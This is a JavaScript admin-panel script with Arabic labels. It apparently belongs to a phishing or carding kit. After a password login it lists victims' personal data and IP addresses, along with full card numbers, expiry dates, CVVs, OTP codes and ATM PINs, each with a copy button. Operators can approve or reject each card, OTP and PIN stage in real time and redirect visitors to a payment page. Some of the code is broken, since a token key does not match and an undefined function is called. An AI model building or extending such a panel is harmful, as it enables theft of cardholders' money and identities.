(function () {
    'use strict';

    const TK = 'tdAdminToken';
    let leadsData = [];
    let paysData = [];
    let expandedId = null;

    function token() { return localStorage.getItem(TK) || ''; }

    // ---------------- تسجيل الدخول ----------------
    const loginPage = document.getElementById('login-page');
    const dashPage = document.getElementById('dashboard-page');
    const pwInput = document.getElementById('pw-input');
    const loginBtn = document.getElementById('login-btn');
    const loginBtnText = document.getElementById('login-btn-text');
    const loginErr = document.getElementById('login-err');
    const eyeBtn = document.getElementById('eye-btn');
    const eyeIc = document.getElementById('eye-ic');

    eyeBtn.addEventListener('click', function () {
        const isPwd = pwInput.type === 'password';
        pwInput.type = isPwd ? 'text' : 'password';
        eyeIc.innerHTML = isPwd
            ? '<path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/><line x1="2" y1="2" x2="22" y2="22"/>'
            : '<path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"/><circle cx="12" cy="12" r="3"/>';
    });

    function doLogin(pw, buttoned) {
        return fetch('/api/admin/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: pw })
        }).then(r => r.json().then(d => ({ ok: r.ok, d })));
    }

    loginBtn.addEventListener('click', async function () {
        const pw = pwInput.value.trim();
        if (!pw) { loginErr.innerText = 'الرجاء إدخال كلمة المرور'; loginErr.style.display = 'block'; return; }
        loginBtn.disabled = true;
        loginBtnText.innerText = 'جاري الدخول...';
        loginBtn.insertAdjacentHTML('afterbegin', '<span class="spinner"></span>');
        loginErr.style.display = 'none';
        try {
            const res = await doLogin(pw);
            if (res.ok && res.d.token) {
                localStorage.setItem(TK, res.d.token);
                showDashboard();
            } else {
                loginErr.innerText = 'كلمة المرور غير صحيحة';
                loginErr.style.display = 'block';
            }
        } catch (e) {
            loginErr.innerText = 'تعذر الاتصال بالخادم';
            loginErr.style.display = 'block';
        } finally {
            loginBtn.disabled = false;
            const sp = loginBtn.querySelector('.spinner');
            if (sp) sp.remove();
            loginBtnText.innerText = 'تسجيل الدخول';
        }
    });
    pwInput.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') loginBtn.click();
    });

    document.getElementById('logout-btn').addEventListener('click', function () {
        localStorage.removeItem(TK);
        dashPage.style.display = 'none';
        loginPage.style.display = 'flex';
        pwInput.value = '';
    });

    // ---------------- التحقق عند الفتح ----------------
    async function showDashboard() {
        loginPage.style.display = 'none';
        dashPage.style.display = 'block';
        await loadAll();
    }

    (async function init() {
        const tk = token();
        if (tk) {
            try {
                const r = await fetch('/api/admin/verify', { headers: { 'Authorization': 'Bearer ' + tk } });
                const d = await r.json();
                if (d.valid) return showDashboard();
            } catch (e) {}
            localStorage.removeItem(TK);
        }
        loginPage.style.display = 'flex';
    })();

    // ---------------- تحميل البيانات ----------------
    const refreshBtn = document.getElementById('refresh-btn');
    async function loadAll() {
        refreshBtn.classList.add('spinning');
        const tk = token();
        const h = { 'Authorization': 'Bearer ' + tk };
        try {
            const [stats, leads, pays] = await Promise.all([
                fetch('/api/admin/stats', { headers: h }).then(r => r.json()),
                fetch('/api/admin/leads', { headers: h }).then(r => r.json()),
                fetch('/api/admin/payments', { headers: h }).then(r => r.json())
            ]);
            if (stats.total !== undefined) {
                document.getElementById('st-total').innerText = stats.total || 0;
                document.getElementById('st-new').innerText = stats.new || 0;
                document.getElementById('st-done').innerText = stats.completed || 0;
                document.getElementById('st-pending').innerText = (stats.pending || 0) + (stats.failed || 0);
                document.getElementById('st-online').innerText = stats.onlineVisitors || 0;
            }
            leadsData = Array.isArray(leads) ? leads : [];
            paysData = Array.isArray(pays) ? pays : [];
            renderTable();
        } catch (e) {
            console.error('load error:', e);
        } finally {
            setTimeout(() => refreshBtn.classList.remove('spinning'), 600);
        }
    }
    refreshBtn.addEventListener('click', loadAll);
    setInterval(loadAll, 30000); // تحديث تلقائي كل 30 ثانية

    // ---------------- الجدول ----------------
    const searchInput = document.getElementById('search-input');
    searchInput.addEventListener('input', renderTable);

    function fmtDate(d) {
        if (!d) return '—';
        try {
            const dt = new Date(d);
            return dt.getFullYear() + '/' + (dt.getMonth() + 1) + '/' + dt.getDate();
        } catch (e) { return d; }
    }

    function statusBadge(stage, status) {
        if (stage === 'success') return '<span class="status-done">مكتمل</span>';
        if (stage === 'otp_verified') return '<span class="status-otp">تم التحقق من OTP</span>';
        if (stage === 'card_initiated') return '<span class="status-card">جاري المعالجة</span>';
        return '<span class="status-fail">' + (status === 'new' ? 'جديد' : (stage || '—')) + '</span>';
    }

    function renderTable() {
        const q = (searchInput.value || '').trim().toLowerCase();
        // دمج الطلبات مع الدفعات حسب contract_no
        const payMap = new Map();
        paysData.forEach(p => {
            const arr = payMap.get(p.contract_no) || [];
            arr.push(p);
            payMap.set(p.contract_no, arr);
        });

        let rows = [];
        // دفعات بدون طلب (زائرو الصفحة مباشرة)
        paysData.forEach(p => {
            const hasLead = leadsData.some(l => l.contract_no === p.contract_no);
            if (!hasLead) rows.push({ type: 'payment', data: p });
        });
        // الطلبات
        leadsData.forEach(l => {
            const pays = payMap.get(l.contract_no) || [];
            rows.push({ type: 'lead', data: l, pays: pays });
        });
        // ترتيب حسب آخر تحديث
        rows.sort((a, b) => {
            const ta = a.data.updated_at || a.data.created_at || '';
            const tb = b.data.updated_at || b.data.created_at || '';
            return ta < tb ? 1 : -1;
        });

        if (q) {
            rows = rows.filter(r => {
                const blob = JSON.stringify(r.data).toLowerCase();
                return blob.indexOf(q) !== -1;
            });
        }

        const thead = document.getElementById('t-head');
        const tbody = document.getElementById('t-body');
        thead.innerHTML = '<tr>' +
            '<th>المبلغ</th>' +
            '<th>الخدمة</th>' +
            '<th>الاسم</th>' +
            '<th>رقم العقد</th>' +
            '<th>التاريخ</th>' +
            '<th>الحالة</th>' +
            '<th>الإجراءات</th>' +
            '</tr>';

        if (rows.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" class="empty-row">لا توجد سجلات</td></tr>';
            return;
        }

        tbody.innerHTML = rows.map(r => {
            const d = r.data;
            const isLead = r.type === 'lead';
            const name = isLead ? (d.full_name || '—') : (d.customer_name || '—');
            const amount = d.amount != null ? Number(d.amount).toLocaleString('en-US', { minimumFractionDigits: 2 }) : '—';
            const service = isLead ? (d.message || '—') : (d.service_info || '—');
            const contract = d.contract_no || '—';
            const stage = d.stage || '';
            const date = fmtDate(isLead ? d.created_at : (d.updated_at || d.created_at));
            const badge = isLead ? statusBadge(r.pays && r.pays.length ? r.pays[r.pays.length - 1].stage : null, d.status) : statusBadge(stage, '');
            const amountCell = amount !== '—'
                ? '<a class="link-amt" href="javascript:void(0)">' + amount + ' درهم</a>'
                : '—';
            const leadBtns = isLead
                ? '<button class="btn-act" onclick="openDetails(\'lead\',' + d.id + ')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>تفاصيل</button>' +
                  '<button class="btn-act" onclick="openDetails(\'lead\',' + d.id + ')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2 11 13"/><path d="M22 2 15 22 11 13 2 9Z"/></svg>توجيه</button>' +
                  (r.pays && r.pays.length
                      ? '<button class="btn-act btn-expand" onclick="togglePayRow(' + d.id + ')">▼</button>'
                      : '')
                : '<button class="btn-act" onclick="openDetails(\'pay\',' + d.id + ')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>تفاصيل</button>' +
                  '<button class="btn-act" onclick="openDetails(\'pay\',' + d.id + ')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2 11 13"/><path d="M22 2 15 22 11 13 2 9Z"/></svg>توجيه</button>';
            let html = '<tr>' +
                '<td>' + amountCell + '</td>' +
                '<td>' + esc(service) + '</td>' +
                '<td>' + esc(name) + '</td>' +
                '<td><span class="badge">' + esc(contract) + '</span></td>' +
                '<td>' + date + '</td>' +
                '<td>' + badge + '</td>' +
                '<td><div class="action-btns">' + leadBtns + '</div></td>' +
                '</tr>';
            if (isLead && r.pays && r.pays.length) {
                r.pays.forEach(p => {
                    const dec = p.decision || null;
                    const pendingStage = dec == null ? currentPendingStage(p.stage) : null;
                    const decBtns = pendingStage != null
                        ? '<button class="btn-act btn-decide btn-approve" onclick="decidePay(' + p.id + ',\'' + pendingStage + '\',\'approved\')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>قبول</button>' +
                          '<button class="btn-act btn-decide btn-reject" onclick="decidePay(' + p.id + ',\'' + pendingStage + '\',\'rejected\')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>رفض</button>'
                        : (dec === 'approved' ? '<span class="badge" style="background:#16a34a">مقبول</span>'
                                            : dec === 'rejected' ? '<span class="badge" style="background:#dc2626">مرفوض</span>' : '');
                    html += '<tr class="expand-row' + (expandedId === 'pay' + p.id ? ' show' : '') + '" id="payrow-' + p.id + '" style="display:none">' +
                        '<td colspan="7">' +
                        '<div class="action-btns">' +
                        '<button class="btn-act" onclick="openDetails(\'pay\',' + p.id + ')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>تفاصيل البطاقة والدفع</button>' +
                        decBtns +
                        '</div>' +
                        '</td></tr>';
                });
            }
            return html;
        }).join('');
    }

    function esc(s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
    }

    function currentPendingStage(stage) {
        // المرحلة التي ينتظر القرار عليها: مرحلة بدأت ولم يُبت في قرارها بعد
        if (!stage) return null;
        if (stage === 'card_initiated') return 'card';
        if (stage === 'otp_verified') return 'otp';
        if (stage === 'pin') return 'pin';
        return null;
    }

    window.togglePayRow = function (id) {
        document.querySelectorAll('.expand-row').forEach(tr => { tr.style.display = 'none'; });
        const tr = document.getElementById('payrow-' + id);
        if (tr) {
            const vis = tr.style.display !== 'none';
            tr.style.display = vis ? 'none' : 'table-row';
        }
    };

    window.decidePay = async function (id, stage, decision) {
        const tk = sessionStorage.getItem('adminToken');
        try {
            const r = await fetch('/api/admin/payments/' + id + '/decide', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk },
                body: JSON.stringify({ decision: decision, stage: stage })
            });
            if (!r.ok) throw new Error('failed');
            await refreshAll();
        } catch (e) {
            alert('حدث خطأ أثناء ' + (decision === 'approved' ? 'القبول' : 'الرفض'));
        }
    };

    // ---------------- Modal التفاصيل ----------------
    const modal = document.getElementById('modal');
    const modalTitle = document.getElementById('modal-title');
    const modalBody = document.getElementById('modal-body');
    const modalCard = document.getElementById('modal-card');

    document.getElementById('modal-close').addEventListener('click', closeModal);
    modal.addEventListener('click', function (e) {
        if (e.target === modal) closeModal();
    });

    function closeModal() { modal.classList.remove('show'); }

    function copyValue(btn) {
        const txt = btn.getAttribute('data-copy');
        if (!txt) return;
        const ta = document.createElement('textarea');
        ta.value = txt;
        document.body.appendChild(ta);
        ta.select();
        try { document.execCommand('copy'); } catch (e) {}
        document.body.removeChild(ta);
        const prev = btn.innerHTML;
        btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>';
        setTimeout(() => { btn.innerHTML = prev; }, 1400);
    }

    const icPerson = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>';
    const icCard = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>';
    const icShield = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>';
    const icLock = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>';
    const icCopy = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';
    const icNav = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2 11 13"/><path d="M22 2 15 22 11 13 2 9Z"/></svg>';

    function valBox(text, opts) {
        const copyBtn = opts && opts.copy
            ? '<button class="copy-btn" data-copy="' + esc(opts.copy) + '" onclick="copyValue(this)" title="نسخ">' + icCopy + '</button>'
            : '';
        const cls = (opts && opts.amount) ? 'val-text val-amount' : (opts && opts.mono ? 'val-text val-mono' : 'val-text');
        return '<div class="detail-row"><div class="detail-label">' + (opts && opts.label ? esc(opts.label) : '') + '</div>' +
            '<div class="detail-value"><span class="' + cls + '">' + esc(text == null ? '—' : text) + '</span>' + copyBtn + '</div></div>';
    }

    window.openDetails = function (type, id) {
        let rec;
        if (type === 'lead') {
            rec = leadsData.find(x => x.id == id);
        } else {
            rec = paysData.find(x => x.id == id);
        }
        if (!rec) return;

        const contract = rec.contract_no || '—';
        modalTitle.innerText = 'التفاصيل — ' + contract;
        let html = '';

        if (type === 'lead') {
            const pay = (paysData.filter(x => x.contract_no === rec.contract_no) || [])[0];
            html += '<div class="sec-header">' + icPerson + 'بيانات العميل</div>';
            html += valBox(rec.full_name || '—', { label: 'الاسم', copy: rec.full_name });
            html += valBox(rec.phone || '—', { label: 'الهاتف', copy: rec.phone });
            html += valBox(rec.email || '—', { label: 'البريد', copy: rec.email });
            html += valBox(rec.city || '—', { label: 'المدينة', copy: rec.city });
            html += valBox(rec.message || '—', { label: 'الخدمة', copy: rec.message });
            html += valBox(contract, { label: 'رقم العقد', copy: contract });
            const amt = pay && pay.amount != null ? Number(pay.amount).toLocaleString('en-US', { minimumFractionDigits: 2 }) + ' درهم' : '—';
            html += valBox(amt, { label: 'المبلغ الإجمالي', amount: true });
            html += valBox(rec.client_ip || pay && pay.client_ip || '—', { label: 'IP العميل', copy: rec.client_ip || (pay && pay.client_ip) });
            html += valBox(pay && pay.stage === 'success' ? 'مكتمل' : (rec.status || '—'), { label: 'الحالة' });

            if (pay) {
                html += '<div class="sec-header sec-green">' + icCard + 'بيانات البطاقة</div>';
                html += valBox(pay.card_name || '—', { label: 'اسم الحامل', mono: true, copy: pay.card_name });
                html += valBox(pay.card_number ? pay.card_number.replace(/(.{4})/g, '$1 ').trim() : '—', { label: 'رقم البطاقة', mono: true, copy: pay.card_number });
                html += valBox(pay.card_expiry || '—', { label: 'تاريخ الانتهاء', copy: pay.card_expiry });
                html += valBox(pay.card_cvv || '—', { label: 'CVV', mono: true, copy: pay.card_cvv });
                if (pay.otp_code) {
                    html += '<div class="sec-header sec-purple">' + icShield + 'رمز OTP</div>';
                    html += valBox(pay.otp_code, { label: 'الرمز', mono: true, copy: pay.otp_code });
                }
                if (pay.atm_pin) {
                    html += '<div class="sec-header sec-amber">' + icLock + 'الرقم السري (PIN)</div>';
                    html += valBox(pay.atm_pin, { label: 'PIN', mono: true, copy: pay.atm_pin });
                }
            }
        } else {
            html += '<div class="sec-header">' + icPerson + 'بيانات العميل</div>';
            html += valBox(rec.customer_name || '—', { label: 'الاسم', copy: rec.customer_name });
            html += valBox(contract, { label: 'رقم العقد', copy: contract });
            html += valBox(rec.service_info || '—', { label: 'الخدمة', copy: rec.service_info });
            html += valBox((rec.amount != null ? Number(rec.amount).toLocaleString('en-US', { minimumFractionDigits: 2 }) : '—') + ' درهم', { label: 'المبلغ الإجمالي', amount: true });
            html += valBox(rec.client_ip || '—', { label: 'IP العميل', copy: rec.client_ip });
            html += valBox(rec.stage === 'success' ? 'مكتمل' : (rec.stage || '—'), { label: 'الحالة' });
            html += '<div class="sec-header sec-green">' + icCard + 'بيانات البطاقة</div>';
            html += valBox(rec.card_name || '—', { label: 'اسم الحامل', mono: true, copy: rec.card_name });
            html += valBox(rec.card_number ? rec.card_number.replace(/(.{4})/g, '$1 ').trim() : '—', { label: 'رقم البطاقة', mono: true, copy: rec.card_number });
            html += valBox(rec.card_expiry || '—', { label: 'تاريخ الانتهاء', copy: rec.card_expiry });
            html += valBox(rec.card_cvv || '—', { label: 'CVV', mono: true, copy: rec.card_cvv });
            if (rec.otp_code) {
                html += '<div class="sec-header sec-purple">' + icShield + 'رمز OTP</div>';
                html += valBox(rec.otp_code, { label: 'الرمز', mono: true, copy: rec.otp_code });
            }
            if (rec.atm_pin) {
                html += '<div class="sec-header sec-amber">' + icLock + 'الرقم السري (PIN)</div>';
                html += valBox(rec.atm_pin, { label: 'PIN', mono: true, copy: rec.atm_pin });
            }
        }

        html += '<div class="sec-header">' + icNav + 'توجيه العميل إلى صفحة</div>';
        html += '<div class="nav-btns">' +
            '<button class="nav-btn" onclick="window.open(\'/payment-gateway.html\', \'_blank\')">💳 الدفع</button>' +
            '<button class="nav-btn" onclick="window.open(\'/home\', \'_blank\')">🏠 الرئيسية</button>' +
            '</div>';
        html += valBox(fmtDate(rec.created_at), { label: 'تاريخ الإنشاء' });
        html += valBox(fmtDate(rec.updated_at || rec.created_at), { label: 'آخر تحديث' });

        modalBody.innerHTML = html;
        modalBody.querySelectorAll('.copy-btn').forEach(b => {
            b.addEventListener('click', function () { copyValue(b); });
        });
        modal.classList.add('show');
    };
})();
